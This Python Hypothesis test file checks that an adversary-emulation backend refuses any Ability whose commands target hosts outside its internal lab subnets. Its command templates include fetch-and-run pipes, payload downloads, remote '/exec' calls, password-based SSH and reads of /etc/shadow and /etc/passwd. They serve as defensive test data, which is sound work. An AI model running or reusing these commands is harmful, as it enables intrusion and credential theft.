"""Property-based test for Property 1 of the pipeline-ui design (task 4.3).

# Feature: pipeline-ui, Property 1: Nenhuma emulação inicia com destino externo.
# Para qualquer Adversary com qualquer conjunto de Abilities e comandos, se pelo
# menos um comando tem endereço de destino que não pertence às subnets internas
# (192.168.10.0/24, 192.168.20.0/24, 192.168.30.0/24), então o Backend recusa a Ability
# e não inicia a Operação, identificando a Ability e o comando com destino externo.

Validates: Requisitos 6.1, 6.2

This is a normal feature property test (the pipeline-ui spec is a ``feature``
spec, not a bugfix): the property is expected to HOLD on the current
implementation. It complements the example-based unit tests in
``test_subnet_validator.py`` by exercising the containment verdict across many
generated Adversaries whose Abilities mix internal destinations (IPs inside the
three lab /24s) with external ones (guaranteed-external public IPs and
hostnames such as ``nmap.org``).

Strategy design (robustness):

- Internal destinations are drawn directly from the three internal ``/24``
  networks via :mod:`ipaddress`, so they are internal by construction.
- External IPs are generated as arbitrary IPv4 literals and then **filtered with
  ipaddress** to guarantee they are global (public) and NOT contained in any of
  the internal subnets. This avoids ever accidentally producing an internal IP
  when an external one is intended.
- External hostnames (``nmap.org`` style) are always external — the validator
  performs no DNS resolution.
- Each generated command embeds its destination in a curated-style command
  (``curl``/``wget``/``ssh``/``sshpass ... user@host``). We track, out of band,
  whether each generated command is actually external so the assertions do not
  depend on the parser/validator under test to decide the oracle.

No network access and no real environment: everything is pure in-memory
generation and pure-Python classification.
"""

from __future__ import annotations

import ipaddress

from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from app.services.containment.subnet_validator import (
    INTERNAL_SUBNETS,
    validate_abilities,
    validate_commands,
)

# ---------------------------------------------------------------------------
# Building blocks
# ---------------------------------------------------------------------------

# Every host address available inside the three internal /24 subnets. Drawing
# from this pool guarantees an internal destination by construction.
_INTERNAL_IPS: list[str] = [
    str(host)
    for network in INTERNAL_SUBNETS
    for host in network.hosts()
]

# A small set of external hostnames in the style of the curated commands.
_EXTERNAL_HOSTNAMES: list[str] = [
    "nmap.org",
    "github.com",
    "raw.githubusercontent.com",
    "pypi.org",
    "downloads.example.co",
    "deb.debian.org",
]


def _is_internal_ip(address: str) -> bool:
    """True iff ``address`` is an IPv4 literal inside an internal subnet."""
    try:
        ip = ipaddress.ip_address(address)
    except ValueError:
        return False
    return any(ip in network for network in INTERNAL_SUBNETS)


# Internal destination IPs (always inside the lab subnets).
internal_ip_strategy = st.sampled_from(_INTERNAL_IPS)

# Guaranteed-external IPv4 literals. Rather than sampling the whole 32-bit space
# and filtering (which rejects a large fraction and makes Hypothesis "give up"),
# we draw from public IPv4 ranges chosen to be globally routable and to never
# overlap the internal 172.20/21/22.0.0/24 subnets. A light guard filters out
# the few non-global corners (e.g. broadcast) to keep the guarantee exact.
_PUBLIC_IPV4_BLOCKS: tuple[ipaddress.IPv4Network, ...] = (
    ipaddress.ip_network("8.8.8.0/24"),        # public DNS block
    ipaddress.ip_network("203.0.113.0/24"),    # TEST-NET-3 (global for our test)
    ipaddress.ip_network("198.51.100.0/24"),   # TEST-NET-2
    ipaddress.ip_network("1.1.1.0/24"),        # public
    ipaddress.ip_network("93.184.216.0/24"),   # example.com block
    ipaddress.ip_network("151.101.0.0/24"),    # public CDN
)

external_ip_strategy = (
    st.sampled_from(_PUBLIC_IPV4_BLOCKS)
    .flatmap(
        lambda net: st.integers(min_value=1, max_value=254).map(
            lambda host: str(net.network_address + host)
        )
    )
    .filter(lambda ip: not _is_internal_ip(ip))
)

external_hostname_strategy = st.sampled_from(_EXTERNAL_HOSTNAMES)


# ---------------------------------------------------------------------------
# Command builders. Each returns (command, is_external).
# ---------------------------------------------------------------------------


@st.composite
def internal_command(draw: st.DrawFn) -> tuple[str, bool]:
    """A curated-style command whose only destination is an internal lab IP."""
    ip = draw(internal_ip_strategy)
    template = draw(
        st.sampled_from(
            [
                "curl -X POST -F 'cmd=whoami' http://{ip}:5055/exec",
                "wget http://{ip}/payload.sh",
                "sshpass -p Passw0rd ssh attacker@{ip} 'whoami'",
                "ssh attacker@{ip} 'id'",
            ]
        )
    )
    return template.format(ip=ip), False


@st.composite
def local_command(draw: st.DrawFn) -> tuple[str, bool]:
    """A purely-local command with no destination at all (never external)."""
    command = draw(
        st.sampled_from(
            [
                "whoami",
                "cat /etc/passwd",
                "echo 'mining crypto'",
                "uname -a",
                "id",
            ]
        )
    )
    return command, False


@st.composite
def external_command(draw: st.DrawFn) -> tuple[str, bool]:
    """A curated-style command whose destination is guaranteed external.

    Uses either a guaranteed-external public IP or an external hostname. Either
    way the destination is not within the internal subnets, so the command must
    cause the Ability (and the Operation) to be refused.
    """
    use_hostname = draw(st.booleans())
    if use_hostname:
        host = draw(external_hostname_strategy)
        template = draw(
            st.sampled_from(
                [
                    "wget https://{host}/dist/nmap-7.98.tgz",
                    "curl -sSL https://{host}/install.sh | sh",
                    "git clone https://{host}/repo.git",
                    "sshpass -p x ssh attacker@{host} 'id'",
                ]
            )
        )
    else:
        host = draw(external_ip_strategy)
        template = draw(
            st.sampled_from(
                [
                    "wget http://{host}/payload",
                    "curl http://{host}:8080/x",
                    "sshpass -p x ssh attacker@{host} 'id'",
                    "ssh root@{host} 'cat /etc/shadow'",
                ]
            )
        )
    return template.format(host=host), True


# One command of any flavor, tagged with whether it is external.
any_command = st.one_of(internal_command(), local_command(), external_command())


@st.composite
def ability_spec(draw: st.DrawFn) -> tuple[str, str, list[tuple[str, bool]]]:
    """Generate a single Ability: (ability_id, name, [(command, is_external)])."""
    ability_id = draw(
        st.text(alphabet="abcdef0123456789-", min_size=4, max_size=16).filter(
            lambda s: s.strip("-") != ""
        )
    )
    name = draw(
        st.sampled_from(
            [
                "T1190 - Exploit Public-Facing Application",
                "T1068 - Exploitation for Privilege Escalation",
                "T1016 - System Network Configuration Discovery",
                "T1059 - Command and Scripting Interpreter",
            ]
        )
    )
    commands = draw(st.lists(any_command, min_size=1, max_size=4))
    return ability_id, name, commands


class _Ability:
    """Duck-typed Ability accepted by ``validate_abilities`` (executors dicts)."""

    def __init__(self, ability_id: str, name: str, commands: list[str]) -> None:
        self.ability_id = ability_id
        self.name = name
        self.executors = [
            {"name": "sh", "platform": "linux", "command": command}
            for command in commands
        ]


# ---------------------------------------------------------------------------
# The property.
# ---------------------------------------------------------------------------


@settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
@given(abilities=st.lists(ability_spec(), min_size=1, max_size=6))
def test_property1_external_destination_blocks_operation(
    abilities: list[tuple[str, str, list[tuple[str, bool]]]],
) -> None:
    """Property 1: any external destination refuses the ability and the operation.

    # Feature: pipeline-ui, Property 1: Nenhuma emulação inicia com destino externo.
    Validates: Requisitos 6.1, 6.2
    """
    # Build the oracle from the generation tags (independent of the code under
    # test): which abilities/commands are external.
    ability_objects: list[_Ability] = []
    any_external = False
    externally_offending_ability_ids: set[str] = set()

    for ability_id, name, tagged_commands in abilities:
        commands = [cmd for cmd, _ in tagged_commands]
        ability_objects.append(_Ability(ability_id, name, commands))
        if any(is_external for _, is_external in tagged_commands):
            any_external = True
            externally_offending_ability_ids.add(ability_id)

    op_report = validate_abilities(ability_objects)

    if any_external:
        # The whole Operation must be refused (Property 1 / Req. 6.1, 6.2).
        assert op_report.refused is True
        assert op_report.allowed is False

        # Exactly the abilities we tagged external must be the refused ones.
        refused_ids = {r.ability_id for r in op_report.refused_abilities}
        assert refused_ids == externally_offending_ability_ids

        # The offending ability + command + destination must be identified.
        violations = op_report.describe_violations()
        assert violations, "refused operation must describe at least one violation"
        for report in op_report.refused_abilities:
            assert report.offending_commands, "refused ability names its command"
            # Every offending command carries at least one external destination.
            for offending in report.offending_commands:
                assert offending.external_destinations
    else:
        # No external destination anywhere: the Operation is allowed.
        assert op_report.allowed is True
        assert op_report.refused is False
        assert op_report.refused_abilities == []
        assert op_report.describe_violations() == []


@settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
@given(
    internal_cmds=st.lists(internal_command(), max_size=3),
    local_cmds=st.lists(local_command(), max_size=3),
    external_cmds=st.lists(external_command(), min_size=1, max_size=3),
)
def test_property1_single_ability_with_any_external_is_refused_and_identified(
    internal_cmds: list[tuple[str, bool]],
    local_cmds: list[tuple[str, bool]],
    external_cmds: list[tuple[str, bool]],
) -> None:
    """A single Ability containing >=1 external command is refused and identified.

    # Feature: pipeline-ui, Property 1: Nenhuma emulação inicia com destino externo.
    Validates: Requisitos 6.1, 6.2

    Complements the operation-level property with the ability-level guarantee:
    mixing internal + local + (at least one) external commands must refuse the
    ability and surface the external destination in the violation description.
    """
    tagged = internal_cmds + local_cmds + external_cmds
    commands = [cmd for cmd, _ in tagged]

    report = validate_commands(
        commands,
        ability_id="8130dba3-f51c-57d2-9d49-78e9b0bb3c4b",
        ability_name="T1068 - Exploitation for Privilege Escalation",
    )

    assert report.refused is True
    assert report.allowed is False

    violations = report.describe_violations()
    assert violations, "a refused ability must describe its violations"
    # The Ability is named in every violation line, and each offending command
    # is identified with at least one external destination.
    assert all("T1068" in line for line in violations)
    assert report.offending_commands
    for offending in report.offending_commands:
        assert offending.external_destinations
